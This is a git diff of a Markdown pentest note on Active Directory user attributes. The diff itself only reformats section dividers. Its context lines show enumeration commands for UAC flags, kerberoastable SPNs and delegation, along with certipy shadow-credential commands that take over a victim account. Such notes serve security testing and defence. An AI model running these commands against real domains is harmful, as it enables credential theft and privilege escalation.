@@ -17,7 +17,7 @@ linked:
 ---
 # AD - Users Enumeration - User Attributes & UAC Flags
 
-***
+---
 
 ## Critical User Attributes
 
@@ -65,7 +65,7 @@ Get-ADUser -Filter * -Properties Description,Comment,Info,Title,Department |
   Select Name,SamAccountName,Description,Comment,Info
 ```
 
-___
+---
 
 ## userAccountControl (UAC) Flags Decoded
 
@@ -114,7 +114,7 @@ $LS "(&(objectCategory=user)($UAC:=65536))" samAccountName
 $LS "(&(objectCategory=user)($UAC:=2097152))" samAccountName
 ```
 
-___
+---
 
 ## SPN (servicePrincipalName) Attribute
 
@@ -142,7 +142,7 @@ Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipal
   Sort AdminCount -Descending  # priv kerberoastable primero
 ```
 
-___
+---
 
 ## Delegation Attributes
 
@@ -169,7 +169,7 @@ Get-ADUser -Filter {TrustedForDelegation -eq $true -or msDS-AllowedToDelegateTo 
          TrustedToAuthForDelegation
 ```
 
-___
+---
 
 ## Shadow Credentials (msDS-KeyCredentialLink)
 
@@ -194,7 +194,7 @@ certipy shadow auto -u atacante -p pass -account 'victim' -dc-ip <DC>
 certipy shadow clear -u atacante -p pass -account 'victim' -dc-ip <DC>
 ```
 
-___
+---
 
 ## Detection / Audit Patterns
 
@@ -216,4 +216,4 @@ Get-ADGroupMember "Domain Admins" -Recursive | Get-ADUser -Properties LastLogonD
   Sort whenCreated -Descending
 ```
 
-***
+---
